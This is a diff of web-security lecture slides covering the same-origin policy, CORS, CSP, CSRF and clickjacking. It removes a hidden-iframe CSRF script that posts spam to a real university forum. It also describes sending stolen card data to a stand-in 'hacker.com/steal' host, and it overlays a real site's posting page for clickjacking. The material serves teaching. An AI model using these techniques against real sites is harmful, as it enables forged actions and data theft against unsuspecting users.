@@ -37,7 +37,7 @@ However
 > - Scripts included using **`<script>`** have full access (thus SOP cannot block [injected](XSS) [JavaScript]());
 > - Other tags that violate the SOP (for a reason): `<img>`, `<link>`, `<embed>`, `<object>`, `<iframe>`, `<bgsound>`, ...
 > - **`window.name`** violates the SOP (ok, it is not much used anyway);
-> - **`window.postMessage`**, introduced in [HTML5](HTML), promises a new wave of security holes!
+> - [**`window.postMessage`**](https://developer.mozilla.org/en-US/docs/DOM/window.postMessage), introduced in [HTML5](HTML), promises a new wave of security holes!
 
 Read <http://code.google.com/p/browsersec/wiki/Part2>.
 
@@ -136,7 +136,7 @@ $(function() {
 
 Classic solution: **Proxies**
 
-Write a [PHP]() program that makes the connection to the web service.
+Write a server-side program that forwards the connection to the web service.
 
 
 <svg width="700" height="300" style="margin:auto;display:block">
@@ -216,6 +216,8 @@ Write a [PHP]() program that makes the connection to the web service.
   </g>
 </svg>
 
+...Not very satisfactory!
+
 
 # Cross-Origin Resource Sharing
 
@@ -281,10 +283,9 @@ Origin: www.example.com
 > 5. The response is returned to the `XMLHttpRequest` object.
 
 
-
 # CORS and security 
 
-`www.hacker.com` **cannot connect** to `www.mybank.com` **as if she were the user**
+CORS is an **opt-out** protection: `www.hacker.com` **cannot connect** to `www.mybank.com` **as if she were the user**
 
 > - Coherent with the frame and window SOPs;
 
@@ -414,6 +415,7 @@ xhr.open("GET", "https://api.finance.com/cac40?c=total")
 
 **Any other content is only allowed from the same page**
 
+**Problem:** CSP is an **opt-in** protection. Must explicitly configure the web server.
 
 
 # CSRF: legit attacks!
@@ -429,7 +431,7 @@ A legitimate **authenticated user** having some **rights on the data**.
 A malicious **attacker** who:
 
 > - knows the web server API (e.g., the API is public),
-> - controls a third party site **unrelated to the victim server** (e.g. its own, or an [XSS]() injected site).
+> - controls a third party site **unrelated to the victim's server** (e.g. its own, or an [XSS]() injected site).
 
 ## The effects
 
@@ -466,32 +468,22 @@ The attacker gains access to the confidential data as if she were the legitimate
 # CSRF demo: e-campus 2
 
 > 1. Connect to <http://e-campus2.uvsq.fr/>,
-> 2. Go to [the forum section](http://e-campus2.uvsq.fr/Cours/Cours.lucadefe.2012-01-04.1946/cours_forum_view?selected_tab=forum&etudiant=None).
-> 3. Now, suppose you visit a random site (e.g. this site!!!), containing the following **`<iframe>`** (hidden with [**`display:none`**](javascript:hide_frame())):
+> 2. Go to [the course page](http://e-campus2.uvsq.fr/cours/lucadefe/Cours.lucadefe.2012-01-04.1946).
+> 3. Now, suppose you visit a random site (e.g. this site!!!), containing the following **`<iframe>`** (hidden with [**`display:none`**](javascript:hide_frame\(\))):
 
 <iframe id="ecampus" style="width:80%;height:2em;margin:auto;display:block">
 </iframe>
 
 <script>
-$(function() {
-    $('#ecampus').contents().find('body').html('<form id="ecampus-form" method="POST" action="http://e-campus2.uvsq.fr/Cours/Cours.lucadefe.2012-01-04.1946/cours_forum_view"><input type="text" name="title" value="Cheap Viagra" /><input type="text" name="description" value="Cheap Viagra" /><input type="text" name="form.submitted" value="1" /><input type="text" name="form.button.CreerSujetDiscussion" value="" /><input type="submit"/></form>');
-});
 
-function csrf() {
-  $('#ecampus').contents().find('#ecampus-form').submit();
-}
-
-function hide_frame() {
-  $('#ecampus').toggle('slow');
-}
 </script>
 
-> 4. [If you click here](javascript:csrf()), the form is submitted and the [CSRF]() is run.
-> 5. Now refresh [the forum section](http://e-campus2.uvsq.fr/Cours/Cours.lucadefe.2012-01-04.1946/cours_forum_view?selected_tab=forum&etudiant=None) and see what's happened.
+> 4. [If you click here](javascript:csrf\(\)), the form is submitted and the [CSRF]() is run.
+> 5. Now refresh [the course page](http://e-campus2.uvsq.fr/cours/lucadefe/Cours.lucadefe.2012-01-04.1946) and see what's happened.
 
 
 **Note:** If the `<iframe>` had
-  [really been hidden](javascript:hide_frame()), you wouldn't have
+  [really been hidden](javascript:hide_frame\(\)), you wouldn't have
   noticed anything.
 
 **Note:** This could have be done even **without the user clicking!**.
@@ -500,7 +492,7 @@ function hide_frame() {
 
 # AJAX and CSRF: intercepting data
 
-> - The previous attack **cannot be performed** with `XMLHttpRequest`.
+> - Because of the `POST` request, the previous attack **could not have been performed** only with `XMLHttpRequest`.
 > - but [AJAX]() offers new expositions to [CSRF]()!
 
 Imagine an **authenticated API** returning JavaScript requests:
@@ -508,37 +500,50 @@ Imagine an **authenticated API** returning JavaScript requests:
 ~~~ {.javascript}
 HTTP/1.1 200 OK
 Content-Type: text/javascript
+Access-Control-Allow-Origin: *
 ...
 
-var data = new UserData(
+new UserData(
   "firstName", "Pinco"
   "lastName", Pallino",
   "creditCard", "XXXX XXXX XXXX XXXX",
 );
 ~~~
 
+- Data is returned in a **`UserData`** object to be **`eval`**'ed.
+- The  definition of **`UserData`** is in the client's scripts.
+- This is similar to the [JSONP](http://en.wikipedia.org/wiki/JSONP) paradigm.
+
 --------------
 
 
 ## The legitimate application
 
-> 1. Includes a [JavaScript]() library provided by the server
+> 1. The client loads a [JavaScript]() library provided by the server
 
 ~~~ {.html}
 <script src="http://www.server.com/js/api.js"></script>
 ~~~
 
-> 2. Makes the [AJAX]() request to the API
+> 2. The library contains the defintion of `UserData`
+
+~~~ {.javascript}
+function Userdata() {
+  this.creditCard = ...
+}
+~~~
+
+> 3. The client makes the [AJAX]() request to the API
 
 ~~~ {.javascript}
 xhr = new XMLHttpRequest();
 xhr.open("GET", "http://api.server.com/getUserData?user=1000");
 ~~~
 
-> 3. `eval`'s the [JavaScript]() and treats the data.
+> 4. The client `eval`'s the [JavaScript]() and treats the data.
 
 ~~~ {.javascript}
-eval(xhr.response());
+var data = eval(xhr.response());
 var card_number = data[5];
 ~~~
 
@@ -567,7 +572,7 @@ function UserData() {
              "http://api.server.com/getUserData?user=1000");
 ~~~
 
-> 4. The browser sends the data to `http://hacker.com/steal`.
+> 4. The browser sends the data to `http://hacker.com/steal` (because of the `Image()`).
 
 
 # Real world CSRF examples
@@ -598,7 +603,7 @@ function UserData() {
 > - Ask for confirmation;
 > - Make sessions expire quickly;
 > - Use captchas;
-> - Add session-related information to [URL]s;
+> - Add session-related information to [URL]()s;
 > - Hide one-time random tokens (**nonces**) into forms.
 
 **Note:** no definitive protection has been found yet!
@@ -640,7 +645,7 @@ $(function() {
 
 <div style="margin: 1em 3em">
 <iframe id="delicious" 
-src="http://www.delicious.com/post?url=http%3A%2F%2Fwww.cheap-viagra.com&target_stack_id="
+src="http://www.delicious.com/post?url=hacker.com"
 style="width:800px; height:500px; overflow: none; z-index: 1; position: absolute">
 </iframe>
 
@@ -654,7 +659,7 @@ Just waiting for you!
 
 **Hurry up! Register, it's free!**
 
-<input type="button" value="Register for free!" style="position: absolute; top: 406px; left: 620px"/>
+<input type="button" value="Register for free!" style="position: absolute; top: 336px; left: 550px"/>
 
 </div>
 </div>
